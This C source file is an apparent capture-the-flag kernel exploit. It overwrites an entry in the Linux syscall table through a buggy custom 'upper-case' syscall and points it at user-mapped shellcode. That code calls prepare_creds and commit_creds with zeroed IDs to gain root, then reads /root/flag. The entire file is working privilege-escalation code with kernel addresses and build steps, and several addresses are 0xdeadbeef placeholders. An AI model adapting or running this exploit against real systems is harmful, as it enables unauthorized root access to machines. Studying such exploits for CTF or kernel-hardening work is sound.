#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>

#define SYS_OPEN            0xdeadbeef      // __se_sys_openat
#define SYS_READ            0xdeadbeef      // __se_sys_read
#define SYS_WRITE           0xdeadbeef      // __se_sys_write

// modify the below based on what you see in /proc/kallsyms
#define SYS_CALL_TABLE_BASE 0x8000e348      // sys_call_table
#define NR_SYS_UPPER_CASE	223             // the unused syscall number we hijack

#define CRED_ALLOC_BLANK     0xdeadbeef      // cred_alloc_blank
#define CRED_PREPARE_CRED    0x8003f44c      // prepare_creds
#define CRED_COMMIT_CRED     0x8003f56c      // commit_creds

#define KB 1024
#define MB (KB) * (KB)
#define BUFF_SIZE (KB)*1

typedef uint32_t u32;


/*
   Compile with -no-pie. 

   gcc -no-pie -o exploit exploit.c


compile functions used in kernel space with -mregparm=3 beacuse we need the same parameter passing API as the linux kernel
   */




/* 
   asmlinkage long sys_upper(char *in, char* out);

    int __se_sys_setreuid(unsigned ruid, unsigned euid);

    Credentials related:
    --------------------

    struct cred *cred_alloc_blank(void);
    struct cred *prepare_creds(void);
    static int   set_user(struct cred *new)
    int          commit_creds(struct cred *new);

    struct cred is defined in include/linux/cred.h

*/

const char* flagfile = "/root/flag";
//const char* flagfile = "/home/geri/fakeflag";
//const char* flagfile = "/tmp/m/l";

//typedef int (*printer_ty)(const char *fmt, ...);
typedef long (*sys_setreuid_ty)(unsigned, unsigned);
typedef long (*sys_open_ty)(int,const char*, int, unsigned);
typedef long (*sys_read_ty)(int,char*, unsigned);
typedef long (*sys_write_ty)(int,const char*, unsigned);

typedef void* (*cred_alloc_blank_ty)(void);     // returns struct cred*
typedef void* (*prepare_creds_ty)(void);        // return struct cred*
typedef __attribute__((regparm(1))) int   (*commit_creds_ty)(void*);        // takes struct cred*

//typedef long (*sys_call)(void);

void* cred_alloc_blank(void)
{
    return ((cred_alloc_blank_ty)CRED_ALLOC_BLANK)();
}

void* prepare_creds(void)
{
    return ((prepare_creds_ty)CRED_PREPARE_CRED)();
}

__attribute__((regparm(1)))  // regparam (number) => pass <number> params through registers
int commit_creds(void* cred) 
{
    return ((commit_creds_ty)CRED_COMMIT_CRED)(cred);
}

__attribute__((regparm(1)))
void setid_on_cred(void* cred)
{
    u32* pcred = (u32*)cred;
    int  i = 0;
    // now we should try to 'blindly' modify the uids. 
    pcred++;                // jump over the 'usage' field
    for(i=0;i<8;i++) {      // we have 8 'id' members in struct cred - overwrite them with 0 (root id)
        *pcred = 0;
        pcred++;
    }
}

/**
 Callback to be installed as syscall to change the process credentials    
*/
int change_cred(char* a, char* b)
{
    int  res = -1;
    void* cred = prepare_creds();
    if(!cred) {
        return -1;
    }
    setid_on_cred(cred);
    res = commit_creds(cred);
    return res;
}

long lower_to_upper(char* from, char* to)
{
    return syscall(NR_SYS_UPPER_CASE, from, to);
} 

void cop_addr(char* to, char* from)
{
    int i;
    for(i=0;i<4;i++) {
        to[i] = from[i];
    }
}

typedef long (*sys_open_ty)(int,const char*, int, unsigned);
typedef long (*sys_read_ty)(int,char*, unsigned);
typedef long (*sys_write_ty)(int,const char*, unsigned);

//typedef long (*sys_call)(void);

int sys_open(const char  *filename, int flags, int mode)
{
    long fd;
    const char* fn = filename;
    int fl = flags;
    int m = mode;
    fd = ((sys_open_ty)SYS_OPEN)(-100, fn, fl, m);
    return fd;
}


int sys_read(int fd, char* buf, unsigned len)
{
    int read = 0;
    read = ((sys_read_ty)SYS_READ)(fd, buf, len);
    return read;
}

int sys_write(int fd, const char* buf, unsigned len)
{
    int written = 0;
    written = ((sys_write_ty)SYS_WRITE)(fd, buf, len);
    return written;
}
/*
int foo()
{
    int i =0;
    for(i=0;i<100;i++) {

    }
    return i;
}
*/

#define AL_SZ (4096 * 8)


int main(int argc, char** argv)
{
    void* remapped_addr = atoi(argv[1]);
    unsigned int syscall_entry_addr = SYS_CALL_TABLE_BASE + (NR_SYS_UPPER_CASE * sizeof(char*));

    printf("Want to mmap code to: %p\n", remapped_addr);
    remapped_addr = mmap(remapped_addr, AL_SZ, PROT_EXEC|PROT_READ|PROT_WRITE, 
                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if(remapped_addr == MAP_FAILED) {
        printf("mmap failed.\n");
        exit(1);
    }

    printf("code got mapped to: %p\n", remapped_addr);
    memset(remapped_addr, '\x90', AL_SZ);

    void* map_start = (void*)0x00008000;
    void* map_end =   (void*)0x00009000;
    int len = map_end - map_start;
    printf("Code length to be copied: %d\n", len);

    // make a little offset here to avoid lower case value byte - might need to manually change!
    remapped_addr += 0x20;

    memcpy(remapped_addr, map_start, len);
    u32 our_rmaped_func = (u32)remapped_addr + ((u32)change_cred - (u32)map_start);
    printf("change_cred addr: %p offset: %u -> Address of remapped func: %p\n",
            change_cred, ((u32)change_cred - (u32)map_start), (void*)our_rmaped_func );

    char fun[5];
    memset(fun, 0 , sizeof(fun));
    cop_addr(fun, (char*)&our_rmaped_func);
    printf("Hit enter to copy our callback %p to syscall table slot: %p\n", (void*)*(unsigned int*)fun,
                                                                            (void*)syscall_entry_addr);
    getchar();
    lower_to_upper(fun, (char*)syscall_entry_addr);
//    validate((char*)syscall_entry_addr, fun);

    char store[64];
    memset(store, 0 , sizeof(store));
    printf("Data will be placed at: %p\n", store);
    printf("Hit enter to get our callback triggered!\n");
    getchar();

    // change the credentials
    int r = lower_to_upper(store, store);   // params will not be used actually here anymore
    
    printf("Credentials change return value: %d\n", r);    

    // validate by calling getuid, geteuid 

    int fd = open(flagfile, O_RDONLY, 0);
    if(fd == -1) {
        printf("Failed to open %s\n", flagfile);
        exit(1);
    }

    printf("Opened %s with fd: %d\n", flagfile, fd);
    r = read(fd, store, sizeof(store)-1);
    printf("Read %d num bytes, data:%s\n", r, store);

    // foo();

    return 0;
}











